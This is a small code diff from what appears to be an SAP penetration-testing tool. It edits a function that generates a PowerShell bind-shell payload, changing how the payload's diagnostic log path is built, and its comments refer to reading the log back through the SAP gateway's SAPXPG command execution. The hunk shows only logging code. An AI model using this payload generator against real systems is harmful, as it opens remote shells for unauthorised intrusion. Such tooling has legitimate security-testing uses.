@@ -1887,9 +1887,13 @@ def _generate_bind_payload(os_type: str, port: int,
         # can inspect what actually happened when the shell doesn't
         # come up.  Read the file back with GW SAPXPG /bin/cat or
         # PowerShell gc if the bind fails silently.
-        log_path = r"$env:TEMP\sapmap_bind.log"
+        # Log path via string concat so $env:TEMP expands at runtime;
+        # single-quoted PS literals don't interpolate, and the earlier
+        # form was writing to a file literally called "$env:TEMP\..."
+        # (with a $ in the name), which Windows rejects — so the
+        # diagnostic file never appeared.
         ps = (f"# SAPMAP-MODE: BIND port={port}\n"
-              f"$__L='{log_path}';"
+              f"$__L=$env:TEMP+'\\sapmap_bind.log';"
               f"$__W={{param($m);try{{Add-Content -Path $__L "
               f"-Value ((Get-Date -Format 'HH:mm:ss.fff')+' '+$m) "
               f"-EA 0}}catch{{}}}};"
